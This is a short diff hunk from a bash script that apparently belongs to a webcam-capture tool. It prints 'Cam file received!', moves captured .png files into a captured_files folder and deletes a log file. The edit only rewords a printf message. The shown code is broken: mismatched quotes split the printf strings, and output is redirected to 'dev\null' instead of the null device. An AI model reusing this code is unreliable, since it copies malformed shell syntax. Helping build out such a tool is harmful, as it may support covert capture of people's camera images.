@@ -95,7 +95,7 @@ fi
 sleep 0.5
 
 if [[ -e "Log.log" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received! Use " mv * (your Path) "To Get Pic \e[0m\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received! Use " mv * your Path "To Get Pic \e[0m\n"
 mv *.png captured_files/new > dev\null 2>&1 || true
 rm -rf Log.log
 fi
